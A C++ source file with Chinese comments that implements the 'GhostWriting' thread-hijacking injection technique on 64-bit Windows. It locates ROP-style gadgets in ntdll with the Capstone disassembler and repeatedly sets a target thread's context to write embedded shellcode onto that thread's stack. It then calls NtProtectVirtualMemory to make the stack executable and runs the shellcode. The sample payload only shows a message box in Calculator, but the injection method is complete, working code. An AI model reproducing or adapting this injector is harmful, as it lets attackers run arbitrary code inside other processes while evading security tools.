#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "include/capstone/capstone.h"

#pragma comment(lib, "capstone.lib")


INT Start = 0x0; // Shellcode入口偏移
BYTE Shellcode[] = {
	0x48,0x89,0x5c,0x24,0x08,0x57,0x48,0x83,0xec,0x20,0x65,0x48,0x8b,0x04,0x25,0x30,
	0x00,0x00,0x00,0x41,0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x48,0x60,0x48,0x8b,0x41,
	0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xd0,0x48,0x8b,0x12,0x48,0x8b,0x4a,0x40,0x0f,
	0xb7,0x41,0x28,0x66,0x83,0xe8,0x4b,0x66,0x41,0x85,0xc1,0x75,0x54,0x0f,0xb7,0x41,
	0x2a,0x66,0x83,0xe8,0x45,0x66,0x41,0x85,0xc1,0x75,0x46,0x0f,0xb7,0x41,0x2c,0x66,
	0x83,0xe8,0x52,0x66,0x41,0x85,0xc1,0x75,0x38,0x0f,0xb7,0x41,0x2e,0x66,0x83,0xe8,
	0x4e,0x66,0x41,0x85,0xc1,0x75,0x2a,0x0f,0xb7,0x41,0x30,0x66,0x83,0xe8,0x45,0x66,
	0x41,0x85,0xc1,0x75,0x1c,0x0f,0xb7,0x41,0x32,0x66,0x83,0xe8,0x4c,0x66,0x41,0x85,
	0xc1,0x75,0x0e,0x66,0x83,0x79,0x34,0x33,0x75,0x07,0x66,0x83,0x79,0x36,0x32,0x74,
	0x63,0x49,0x3b,0xd0,0x75,0x92,0x33,0xdb,0xba,0x5a,0xc1,0xcb,0xc2,0x48,0x8b,0xcb,
	0xe8,0x5b,0x00,0x00,0x00,0xba,0x53,0xc0,0x49,0x9c,0x48,0x8b,0xcb,0x48,0x8b,0xf8,
	0xe8,0x4b,0x00,0x00,0x00,0x48,0x8d,0x0d,0x14,0x01,0x00,0x00,0xff,0xd0,0x48,0x85,
	0xc0,0x74,0x26,0x48,0x8d,0x15,0x16,0x01,0x00,0x00,0x48,0x8b,0xc8,0xff,0xd7,0x48,
	0x85,0xc0,0x74,0x15,0x45,0x33,0xc9,0x4c,0x8d,0x05,0x12,0x01,0x00,0x00,0x48,0x8d,
	0x15,0x13,0x01,0x00,0x00,0x33,0xc9,0xff,0xd0,0x48,0x8b,0x5c,0x24,0x30,0x48,0x83,
	0xc4,0x20,0x5f,0xc3,0x48,0x8b,0x5a,0x20,0xeb,0x9e,0x00,0x00,0x00,0x00,0x00,0x00,
	0x48,0x89,0x74,0x24,0x08,0x48,0x89,0x7c,0x24,0x10,0x48,0x63,0x41,0x3c,0x4c,0x8b,
	0xc1,0x8b,0xf2,0x44,0x8b,0x94,0x08,0x88,0x00,0x00,0x00,0x4c,0x03,0xd1,0x45,0x8b,
	0x4a,0x20,0x41,0x8b,0x7a,0x1c,0x4c,0x03,0xc9,0x48,0x03,0xf9,0x33,0xc9,0x41,0x3b,
	0x4a,0x18,0x73,0x33,0x41,0x8b,0x11,0x49,0x03,0xd0,0x45,0x33,0xdb,0xeb,0x0d,0x45,
	0x6b,0xdb,0x21,0x0f,0xbe,0xc0,0x44,0x03,0xd8,0x48,0xff,0xc2,0x8a,0x02,0x84,0xc0,
	0x75,0xed,0x44,0x3b,0xde,0x74,0x0c,0xff,0xc1,0x49,0x83,0xc1,0x04,0x41,0x3b,0x4a,
	0x18,0x72,0xd1,0x41,0x3b,0x4a,0x18,0x74,0x15,0x8b,0xd1,0x41,0x8b,0x4a,0x24,0x49,
	0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,0xeb,0x02,0x33,0xc0,
	0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x34,0x06,0x00,0x0a,0x32,0x06,0x70,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0xfa,0x00,0x00,0x00,0x90,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x74,0x02,0x00,0x05,0x64,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x01,0x00,0x00,0x8b,0x01,0x00,0x00,0xb0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x41,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x48,0x65,0x6c,0x6c,0x6f,0x00
};

struct GW {
	enum REG { Rbx, Rsi, Rdi };

	REG DREG; // 目的寄存器
	REG SREG; // 源寄存器

	PVOID JMPTOSELFAddress;
	PVOID MOVRETAddress;

	INT Displacement; // 位移数
	INT PopCount; // POP计数
	INT RspCompensation; // RSP补偿
};

BOOL FindJMPTOSELFAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	for (unsigned int i = 0; i < NTDLLCodeSize; i++) {
		if ((NTDLLCode[i] == 0xEB) && (NTDLLCode[i + 1] == 0xFE)) {
			Ghost->JMPTOSELFAddress = NTDLLCode + i;
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	csh Handle;
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &Handle)) {
		_tprintf(_T("[x] Failed to initialize engine\n"));
		return FALSE;
	}

	// 启用细节选项
	cs_option(Handle, CS_OPT_DETAIL, CS_OPT_ON);

	const int MAX_OPCODE_SIZE = 16; // OP指令的最大长度
	const int MAX_OPCODE_COUNT = 5; // 一次性反汇编的数量

	for (unsigned int i = 0; i < NTDLLCodeSize - MAX_OPCODE_SIZE * MAX_OPCODE_COUNT; i++) {

		// 一次性反汇编 MAX_OPCODE_COUNT 条指令
		cs_insn* Insn;
		SIZE_T Count = cs_disasm(Handle, NTDLLCode + i, MAX_OPCODE_SIZE * MAX_OPCODE_COUNT, 0, MAX_OPCODE_COUNT, &Insn);
		if (Count == 0)
			continue;

		// 初始化
		Ghost->MOVRETAddress = 0;
		Ghost->Displacement = 0;
		Ghost->PopCount = 0;
		Ghost->RspCompensation = 0;

		// 开始检查指令
		for (unsigned int j = 0; j < Count; j++) {

			// 第一项必须为 mov [reg1], reg2
			if (j == 0) {

				if (strcmp(Insn->mnemonic, "mov") != 0)
					break;

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
				cs_x86_op* opr = &(Insn[j].detail->x86.operands[1]);

				// 要求左操作数为内存，右操作数为寄存器
				if (opl->type != X86_OP_MEM || opr->type != X86_OP_REG) 
					break;

				// 检查右操作是否为非易蒸发寄存器
				if (opr->reg != X86_REG_RBX &&
					opr->reg != X86_REG_RSI &&
					opr->reg != X86_REG_RDI)
					break;
				

				// 检查左操作数是否为非易蒸发寄存器
				if (opl->mem.base != X86_REG_RBX &&
					opl->mem.base != X86_REG_RSI &&
					opl->mem.base != X86_REG_RDI)
					break;

				// 左操作数是否等于右操作数
				if (opl->mem.base == opr->reg)
					break;

				// 保存源寄存器
				switch (opr->reg)
				{
				case X86_REG_RBX:
					Ghost->SREG = GW::Rbx;
					break;
				case X86_REG_RSI:
					Ghost->SREG = GW::Rsi;
					break;
				case X86_REG_RDI:
					Ghost->SREG = GW::Rdi;
					break;
				}

				// 保存目标寄存器
				switch (opl->mem.base)
				{
				case X86_REG_RBX:
					Ghost->DREG = GW::Rbx;
					break;
				case X86_REG_RSI:
					Ghost->DREG = GW::Rsi;
					break;
				case X86_REG_RDI:
					Ghost->DREG = GW::Rdi;
					break;
				}

				// 保存左操作数的位移数
				Ghost->Displacement = (INT)opl->mem.disp;
			}

			// 寻找 ret 指令
			else if (strcmp(Insn[j].mnemonic, "ret") == 0) {

				Ghost->MOVRETAddress = NTDLLCode + i;

				printf("[+] Found MOV RET Opcode:\n");
				for (unsigned int k = 0; k <= j; k++)
					_tprintf(_T("[+] 0x%p:\t%hs\t\t%hs\n"), NTDLLCode + i, Insn[k].mnemonic, Insn[k].op_str);

				// 找到符合条件的 MOVRETAddress 后直接返回
				cs_free(Insn, Count);
				cs_close(&Handle);
				return TRUE;
			}

			// 允许 mov reg, ?? 指令
			else if (strcmp(Insn[j].mnemonic, "mov") == 0) {

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);

				// 要求左操作数为寄存器
				if (opl->type != X86_OP_REG) {
					break;
				}
			}

			// 允许 add rsp, ?? 指令
			else if (strcmp(Insn[j].mnemonic, "add") == 0) {

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
				cs_x86_op* opr = &(Insn[j].detail->x86.operands[1]);

				// 要求左操作数为寄存器，右操作数为立即数
				if (opl->type != X86_OP_REG || opr->type != X86_OP_IMM)
					break;

				// 如果左操作数是rsp，则保存立即数
				if (opl->reg == X86_REG_RSP)
					Ghost->RspCompensation = (INT)opr->imm;
			}

			// 允许 xor reg, ?? 指令
			else if (strcmp(Insn[j].mnemonic, "xor") == 0) {

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);

				// 要求左操作数为寄存器
				if (opl->type != X86_OP_REG)
					break;
			}

			// 允许 pop reg 指令
			else if (strcmp(Insn[j].mnemonic, "pop") == 0) {
				Ghost->PopCount += 1;
			}

			// 不接受其他指令
			else {
				break;
			}
		}

		cs_free(Insn, Count);
	}

	cs_close(&Handle);

	return FALSE;
}

BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOSELFAddress)
{
	SetThreadContext(Thread, ThreadContext);

	_tprintf(_T("\n"));
	_tprintf(_T("[D] After inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext->Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext->Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext->Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext->Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext->Rip);

	// 唤醒线程
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);

	do {
		ResumeThread(Thread);
		Sleep(3);
		SuspendThread(Thread);

		if (GetThreadContext(Thread, ThreadContext) == 0) {
			_tprintf(_T("[x] GetThreadContext failed, error: 0x%x\n"), GetLastError());
			return FALSE;
		}
		
	} while ((PVOID)ThreadContext->Rip != JMPTOSELFAddress);

	return TRUE;
}

BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
{
	// 获取当前线程上下文
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

	// 设置源寄存器
	DWORD64* SREG;

	switch (Ghost->SREG)
	{
	case GW::Rbx:
		SREG = &ThreadContext.Rbx;
		break;
	case GW::Rsi:
		SREG = &ThreadContext.Rsi;
		break;
	case GW::Rdi:
		SREG = &ThreadContext.Rdi;
		break;
	default:
		SREG = NULL;
		break;
	}

	if (SREG == NULL) {
		_tprintf(_T("[x] Unsupported source register: %d\n"), Ghost->SREG);
		return FALSE;
	}

	// 设置目的寄存器
	DWORD64* DREG;

	switch (Ghost->DREG)
	{
	case GW::Rbx:
		DREG = &ThreadContext.Rbx;
		break;
	case GW::Rsi:
		DREG = &ThreadContext.Rsi;
		break;
	case GW::Rdi:
		DREG = &ThreadContext.Rdi;
		break;
	default:
		DREG = NULL;
		break;
	}

	if (DREG == NULL) {
		_tprintf(_T("[x] Unsupported destination register: %d\n"), Ghost->DREG);
		return FALSE;
	}

	//
	// 计算RSP预留空间
	//

	// 预留Shellcode空间
	INT BytesOfShellcode = sizeof(Shellcode);
	BytesOfShellcode = BytesOfShellcode - (BytesOfShellcode % sizeof(PVOID)) + sizeof(PVOID); // 取 sizeof(PVOID) 的整数倍值

	// 预留NtProtectVirtualMemory参数空间
	INT BytesOfNtProtectVirtualMemoryCallFrame = (1 + 5 + 3) * sizeof(PVOID);

	// 预留JMPTOSELFAddress地址空间
	INT BytesOfJmpToSelfAddress = sizeof(PVOID);

	// 计算RSP栈顶位置
	DWORD64 StackTopAddress = ThreadContext.Rsp
		- BytesOfShellcode
		- BytesOfNtProtectVirtualMemoryCallFrame
		- BytesOfJmpToSelfAddress
		- Ghost->RspCompensation				// 补偿RSP
		- (Ghost->PopCount * sizeof(PVOID));	// 补偿POP

	// 栈对齐
	StackTopAddress = StackTopAddress - (StackTopAddress % 16) - 16;

	//
	// RSP顶端写入JMPTOSELFAddress地址
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// 源寄存器储存将要写入的数据
	*SREG = (DWORD64)Ghost->JMPTOSELFAddress;

	// 目的寄存器储存将要写入的地址
	*DREG = ThreadContext.Rsp
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
		- Ghost->Displacement;					// 修正MOV指令中的位移地址

	// RIP指向MOVRETAddress
	ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

	// 写入数据
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// 写入NtProtectVirtualMemory参数
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// 这是个fastcall调用约定的函数，传参顺序 RCX RDX R8 R9，OldAccessProtection参数使用压栈传递
	// 
	//NTSTATUS NtProtectVirtualMemory(
	//	HANDLE ProcessHandle,
	//	PVOID *BaseAddress,
	//	SIZE_T *NumberOfBytesToProtect,
	//	ULONG NewAccessProtection,
	//	PULONG OldAccessProtection)

	DWORD64 NtProtectVirtualMemoryCallFrame[1 + 5 + 3] = { // 这里 1+5+3 如果有改动，前面的BytesOfNtProtectVirtualMemoryCallFrame别忘了改掉

		(DWORD64)Ghost->JMPTOSELFAddress,	// 栈帧：返回地址
		
		(DWORD64)-1,						// 栈帧：参数 ProcessHandle

		ThreadContext.Rsp					// 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
			+ BytesOfJmpToSelfAddress
			+ ((1 + 5 + 0) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		ThreadContext.Rsp					// 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
			+ BytesOfJmpToSelfAddress
			+ ((1 + 5 + 1) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		PAGE_EXECUTE_READWRITE,				// 栈帧：参数 NewAccessProtection

		ThreadContext.Rsp					// 栈帧：参数 OldAccessProtection，注意这是一个指针，指向临时变量 OldAccessProtection
			+ BytesOfJmpToSelfAddress
			+ ((1 + 5 + 2) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),

		ThreadContext.Rsp					// 临时指针 BaseAddress：指向Shellcode区域
			+ BytesOfJmpToSelfAddress
			+ BytesOfNtProtectVirtualMemoryCallFrame
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		(DWORD64)BytesOfShellcode,			// 临时变量 NumberOfBytesToProtect：内存保护的大小
		
		0									// 临时变量 OldAccessProtection：储存原内存权限
	};

	for (int i = 0; i < sizeof(NtProtectVirtualMemoryCallFrame) / sizeof(NtProtectVirtualMemoryCallFrame[0]); i++) {

		// 重置RSP
		ThreadContext.Rsp = StackTopAddress;

		// 源寄存器储存将要写入的数据
		*SREG = NtProtectVirtualMemoryCallFrame[i];

		// 目的寄存器储存将要写入的地址
		*DREG = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// 平衡RSP的补偿
			+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
			- Ghost->Displacement;					// 修正MOV指令中的位移地址

		// RIP指向MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// 写入数据
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// 写入Shellcode
	//

	for (int i = 0; i < BytesOfShellcode / sizeof(PVOID); i++) {

		// 重置RSP
		ThreadContext.Rsp = StackTopAddress;

		// 源寄存器储存将要写入的数据
		*SREG = ((DWORD64*)Shellcode)[i];

		// 目的寄存器储存将要写入的地址
		*DREG = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ BytesOfNtProtectVirtualMemoryCallFrame
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// 平衡RSP的补偿
			+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
			- Ghost->Displacement;					// 修正MOV指令中的位移地址

		// RIP指向MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// 写入数据
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// 执行NtProtectVirtualMemory
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// 栈帧：参数 ProcessHandle
	ThreadContext.Rcx = NtProtectVirtualMemoryCallFrame[1];

	// 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
	ThreadContext.Rdx = NtProtectVirtualMemoryCallFrame[2];

	// 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
	ThreadContext.R8 = NtProtectVirtualMemoryCallFrame[3];

	// 栈帧：参数 NewAccessProtection
	ThreadContext.R9 = NtProtectVirtualMemoryCallFrame[4];

	// RSP指向NtProtectVirtualMemoryCallFrame
	ThreadContext.Rsp = ThreadContext.Rsp
		+ BytesOfJmpToSelfAddress
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿

	// RIP指向NtProtectVirtualMemory
	ThreadContext.Rip = (DWORD64)NtProtectVirtualMemory;

	// 写入数据
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// 执行Shellcode
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// RIP指向Shellcode
	ThreadContext.Rip = ThreadContext.Rsp
		+ BytesOfNtProtectVirtualMemoryCallFrame
		+ BytesOfJmpToSelfAddress
		+ Start									// Shellcode入口偏移
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿

	// RSP指向JMPTOSELFAddress
	ThreadContext.Rsp = ThreadContext.Rsp
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿

	// 写入数据
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	return TRUE; // 约定：注入完成后线程必须处于暂停状态
}

int _tmain(int argc, TCHAR* argv[])
{
	// 获取ntdll模块
	HMODULE NTDLLBase = GetModuleHandle(_T("ntdll.dll"));
	if (NTDLLBase == NULL) {
		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
		return 0;
	}

	// 获取ntdll的.text段地址，以及.text段大小
	PUCHAR NTDLLCode = (PUCHAR)((UINT_PTR)NTDLLBase + 0x1000);
	PIMAGE_NT_HEADERS NTDLLPEHeader = (PIMAGE_NT_HEADERS)((UINT_PTR)NTDLLBase + ((IMAGE_DOS_HEADER*)NTDLLBase)->e_lfanew);
	DWORD NTDLLCodeSize = NTDLLPEHeader->OptionalHeader.SizeOfCode;

	// 获取NtProtectVirtualMemory的函数地址
	PVOID NtProtectVirtualMemory = (PVOID)GetProcAddress(NTDLLBase, "NtProtectVirtualMemory");
	if (NtProtectVirtualMemory == NULL) {
		_tprintf(_T("[x] Can't get NtProtectVirtualMemory address\n"));
		return 0;
	}

	// 鬼写结构体
	GW Ghost;

	// 获取自跳转地址
	if (FindJMPTOSELFAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] JMPTOSELFAddress = %p\n"), Ghost.JMPTOSELFAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find JMPTOSELFAddress\n"));
		return 0;
	}

	// 获取转移返回地址
	if (FindMOVRETAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] MOVRETAddress = %p\n"), Ghost.MOVRETAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find MOVRETAddress\n"));
		return 0;
	}

	// 打开线程
	// HWND Window = FindWindow(NULL, _T("HashCalc"));
	HWND Window = FindWindow(_T("CalcFrame"), NULL);
	// HWND Window = GetShellWindow();
	if (Window == NULL) {
		_tprintf(_T("[x] Can't find target window\n"));
		return 0;
	}

	DWORD ThreadId = GetWindowThreadProcessId(Window, NULL);
	_tprintf(_T("[D] ThreadId = %d\n"), ThreadId);

	HANDLE Thread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ThreadId);
	if (Thread == NULL) {
		_tprintf(_T("[x] Can't open target thread\n"));
		return 0;
	}

	// 暂停线程
	SuspendThread(Thread);

	// 保存线程上下文，用于还原
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

	_tprintf(_T("\n"));
	_tprintf(_T("[D] Before inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext.Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext.Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext.Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext.Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext.Rip);

	// 开始注入，约定：注入完成后线程必须处于暂停状态
	if (Inject(Thread, Window, &Ghost, NtProtectVirtualMemory) == TRUE) {
		_tprintf(_T("[+] Inject success\n"));
	}
	else {
		_tprintf(_T("[-] Inject failed\n"));
	}

	// 还原线程
	SetThreadContext(Thread, &ThreadContext);
	ResumeThread(Thread);

	// 唤醒线程
	PostMessage(Window, WM_USER, 0, 0);

	CloseHandle(Thread);
	return 0;
}
